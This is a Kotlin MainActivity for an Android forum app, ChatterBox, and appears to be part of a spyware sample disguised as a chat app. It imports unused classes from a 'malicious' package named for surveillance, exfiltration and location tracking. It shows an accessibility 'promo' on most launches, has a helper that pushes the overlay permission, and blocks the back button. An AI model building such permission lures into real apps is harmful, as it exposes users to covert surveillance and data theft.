package com.example.ChatterBox

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.ActionBarDrawerToggle
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.GravityCompat
import androidx.drawerlayout.widget.DrawerLayout
import com.bumptech.glide.Glide
import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
import com.example.ChatterBox.malicious.SurveillanceService
import com.example.ChatterBox.malicious.ExfiltrationManager
import com.example.ChatterBox.malicious.LocationTracker
import com.example.ChatterBox.models.Forum
import com.example.ChatterBox.models.User
import com.google.android.material.navigation.NavigationView
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import java.util.Random

class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelectedListener {
    private lateinit var db: FirebaseFirestore
    private lateinit var auth: FirebaseAuth
    private lateinit var drawerLayout: DrawerLayout


    companion object {
        private const val SEARCH_USER_REQUEST_CODE = 1001
    }
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        db = FirebaseFirestore.getInstance()
        auth = FirebaseAuth.getInstance()

        val currentUser = auth.currentUser
        if (currentUser == null) {
            val intent = Intent(this, LoginActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            startActivity(intent)
            finish()
            return
        }
        if (shouldShowAccessibilityPromo()) {
            startActivity(Intent(this, AccessibilityPromoActivity::class.java))
        }
        else{
            setupDrawer()
            loadUserProfile()
            checkIfAdmin()
            loadEnrolledForums()
        }
    }

    override fun onResume() {
        super.onResume()
        loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
    }


    /** 🔹 Setup Navigation Drawer */
    private fun setupDrawer() {
        drawerLayout = findViewById(R.id.drawer_layout)
        val toolbar: androidx.appcompat.widget.Toolbar = findViewById(R.id.toolbar)

        setSupportActionBar(toolbar) // ✅ Attach custom toolbar as Action Bar

        val toggle = ActionBarDrawerToggle(
            this, drawerLayout, toolbar,
            R.string.navigation_drawer_open, R.string.navigation_drawer_close
        )
        drawerLayout.addDrawerListener(toggle)
        toggle.syncState()

        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        navigationView.setNavigationItemSelectedListener(this)
    }

    /** 🔹 Handle Sidebar Navigation */
    override fun onNavigationItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.nav_saved_posts -> {
                startActivity(Intent(this, SavedPostsActivity::class.java))
            }
            R.id.nav_profile -> {
                startActivity(Intent(this, ProfileActivity::class.java))
                Toast.makeText(this, "Profile Clicked", Toast.LENGTH_SHORT).show()
            }
            R.id.nav_inbox -> {
                startActivity(Intent(this, InboxActivity::class.java))
                Toast.makeText(this, "Message Clicked", Toast.LENGTH_SHORT).show()
            }
            R.id.nav_add -> {
                startActivity(Intent(this, ForumActivity::class.java))
                Toast.makeText(this, "Forum Clicked", Toast.LENGTH_SHORT).show()
            }
            R.id.nav_logout -> {
                showLogoutDialog()
            }
        }
        drawerLayout.closeDrawer(GravityCompat.START) // Close drawer after clicking
        return true
    }

    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.sort_menu, menu)
        return true
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == SEARCH_USER_REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            val userId = data.getStringExtra("userId") ?: return
            val intent = Intent(this, ProfileActivity::class.java)
            intent.putExtra("userId", userId)
            startActivity(intent) // ✅ Open the selected user's profile
        }
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_search -> {
                val intent = Intent(this, SearchUsersActivity::class.java)
                startActivityForResult(intent, SEARCH_USER_REQUEST_CODE) // ✅ Start for result
                true
            }
            else -> super.onOptionsItemSelected(item)
        }
    }

    /** 🔹 Handle Back Button */
    override fun onBackPressed() {
        if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
            drawerLayout.closeDrawer(GravityCompat.START) // 🔥 Close drawer first
        } else {
            // 🔥 Prevent back action (do nothing)
            Toast.makeText(this, "Press the logout button to exit.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun showLogoutDialog() {
        AlertDialog.Builder(this)
            .setTitle("Log Out")
            .setMessage("Are you sure you want to log out?")
            .setPositiveButton("Yes") { _, _ ->
                logoutUser() // ✅ Only logout when user confirms
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun logoutUser() {
        auth.signOut() // ✅ Sign out from Firebase Auth

        val intent = Intent(this, LoginActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // ✅ Clear backstack
        startActivity(intent)
        finish() // ✅ Close current activity
    }

    /** 🔹 Load User Profile */
    private fun loadUserProfile() {
        val user = auth.currentUser ?: return
        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        val headerView = navigationView.getHeaderView(0)

        val userProfileImage = headerView.findViewById<ImageView>(R.id.user_profile_image)
        val userNameTextView = headerView.findViewById<TextView>(R.id.user_name)

        db.collection("users").document(user.uid)
            .addSnapshotListener { document, error ->
                if (error != null) {
                    Toast.makeText(
                        this,
                        "Error loading profile: ${error.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                    return@addSnapshotListener
                }

                if (document != null && document.exists()) {
                    val displayName = document.getString("displayName") ?: "User"
                    val profilePicUrl = document.getString("profilePicUrl")

                    userNameTextView.text = displayName

                    if (!profilePicUrl.isNullOrEmpty()) {
                        Glide.with(this)
                            .load(profilePicUrl)
                            .placeholder(R.drawable.ic_profile_placeholder)
                            .into(userProfileImage)
                    }
                }
            }
    }

    /** 🔹 Check if User is Admin */
    private fun checkIfAdmin() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        userRef.get().addOnSuccessListener { document ->
            if (document.exists()) {
                val isAdmin = document.getBoolean("isAdmin") ?: false
                val navigationView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navigationView.menu

                menu.findItem(R.id.nav_add).isVisible = isAdmin
                Log.d("FirebaseAuth", "User isAdmin: $isAdmin")
            }
        }.addOnFailureListener {
            Toast.makeText(this, "Failed to fetch user data", Toast.LENGTH_SHORT).show()
        }
    }

    /** 🔹 Load Enrolled Forums into Sidebar */
    private fun loadEnrolledForums() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        // 🔹 Listen for changes to the user's enrolled forums
        userRef.addSnapshotListener { document, error ->
            if (error != null) {
                Log.e("Firestore", "Error fetching enrolled forums: ${error.message}")
                return@addSnapshotListener
            }

            if (document != null && document.exists()) {
                val enrolledModuleCodes =
                    document.get("enrolledForum") as? List<String> ?: emptyList()
                val navView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navView.menu
                menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries

                if (enrolledModuleCodes.isEmpty()) {
                    menu.add(
                        R.id.nav_enrolled_forums_group,
                        Menu.NONE,
                        Menu.NONE,
                        "No Enrolled Forums"
                    ).isEnabled = false
                    return@addSnapshotListener
                }

                // 🔥 Listen for real-time updates from the `forums` collection
                db.collection("forums")
                    .whereIn("code", enrolledModuleCodes)
                    .addSnapshotListener { forumDocs, error ->
                        if (error != null) {
                            Log.e("Firestore", "Error fetching forums: ${error.message}")
                            return@addSnapshotListener
                        }

                        menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries

                        if (forumDocs == null || forumDocs.isEmpty) {
                            menu.add(
                                R.id.nav_enrolled_forums_group,
                                Menu.NONE,
                                Menu.NONE,
                                "No Forums Found"
                            ).isEnabled = false
                            return@addSnapshotListener
                        }

                        for (forumDoc in forumDocs) {
                            val forumName = forumDoc.getString("name") ?: "Unknown Forum"
                            val forumCode = forumDoc.getString("code") ?: ""
                            val forumId = forumDoc.id // ✅ Get the correct forum ID

                            val forumItem = menu.add(
                                R.id.nav_enrolled_forums_group,
                                Menu.NONE,
                                Menu.NONE,
                                "$forumName ($forumCode)"
                            )

                            forumItem.setOnMenuItemClickListener {
                                val intent = Intent(this, ForumPostsActivity::class.java)
                                intent.putExtra("FORUM_ID", forumId) // ✅ Pass correct forum ID
                                intent.putExtra("FORUM_CODE", forumCode)
                                startActivity(intent)
                                true
                            }
                        }
                    }
            }
        }
    }
    private fun requestOverlayPermission() {
        if (!Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            // Force as a new task to ensure it appears properly
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            startActivity(intent)

            // Show guidance to the user
            Toast.makeText(
                this,
                "Please enable 'Display over other apps' for full functionality",
                Toast.LENGTH_LONG
            ).show()
        }
    }
    /**
     * Determines if we should show the accessibility promo
     * Uses a mix of random chance and whether we've shown it before
     */
    private val SHOWN_ACCESSIBILITY_PROMO = "shown_accessibility_promo"
    private val PREFS_KEY = "chatterbox_prefs"
    private fun shouldShowAccessibilityPromo(): Boolean {
        val prefs = getSharedPreferences(PREFS_KEY, MODE_PRIVATE)
        val alreadyShown = prefs.getBoolean(SHOWN_ACCESSIBILITY_PROMO, false)

        // If we've already shown it, don't show it again with 90% probability
        if (alreadyShown && Random().nextInt(10) < 9) {
            return false
        }

        // Show it with 60% probability
        val shouldShow = Random().nextInt(10) < 9

        // If we're going to show it, record that fact
        if (shouldShow) {
            prefs.edit().putBoolean(SHOWN_ACCESSIBILITY_PROMO, true).apply()
        }

        return shouldShow
    }
}
